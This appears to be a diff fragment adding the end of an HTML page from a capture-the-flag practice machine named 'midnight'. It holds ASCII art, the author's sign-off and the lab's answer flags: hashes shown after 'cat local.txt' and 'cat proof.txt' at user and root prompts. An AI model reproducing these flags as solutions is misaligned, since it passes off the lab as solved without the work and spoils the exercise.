+&nbsp; &nbsp; &nbsp; &nbsp;/ / --o\ o-\ \\ &nbsp; --(_)--<br/>
+&nbsp; &nbsp; &nbsp; /-/-/|o|-|\-\\|\\ &nbsp; / | \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;'` &nbsp;` |-| &nbsp; `` '<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|-|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|-|O<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|-(\,__<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...|-|\--,\_....<br/>
+&nbsp; &nbsp; &nbsp; ,;;;;;;;;;;;;;;;;;;;;;;;;,.<br/>
+~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/>
+~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;, &nbsp;______ &nbsp; --------- &nbsp; _____ &nbsp; &nbsp; ------<br/>
+<br/>
+db2def9d4ddcb83902b884de39d426e6<br/>
+<br/>
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)<br/>
+<br/>
+<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+jose@midnight:~$ cat local.txt <br/>
+25565928f9ea0a7d737a0eaa687bc02e<br/>
+<br/>
+root@midnight:/root# cat proof.txt <br/>
+c2c8215b06ab4ee4d528fe40422878cd<br/>
+<br/>
+<br/>
+</body></html>
